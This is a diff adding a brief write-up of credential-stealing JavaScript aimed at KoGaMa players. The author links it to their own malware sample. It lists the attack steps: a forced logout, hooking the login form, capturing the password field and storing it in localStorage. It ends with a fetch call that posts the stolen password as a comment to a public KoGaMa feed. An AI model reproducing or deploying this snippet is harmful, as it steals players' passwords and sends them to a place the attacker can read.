@@ -1,0 +1,21 @@
+What it actually does:
+
+
+-> Logs you out of your account (Gets /kogama/auth/logout/ )
+-> Hooks into button clicks and keyboard input events on the login form
+-> Captures the value of the password input field (getElementById("password")).
+ (Sampled originally in my own malware found @ https://github.com/vendicatedcore/KoGaMa/tree/main/Website/AccountStealerSample)
+
+-> Saves the password in localStorage under the key "poop" and a flag key "lol"
+
+Sends the captured password to KoGaMa’s public comment API (FEED ID: 31872096) by posting the password as a comment using fetch
+
+Something like:
+
+fetch('https://www.kogama.com/api/feed/31872096/comment/', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ comment: localStorage.getItem('poop') })
+})
+
+
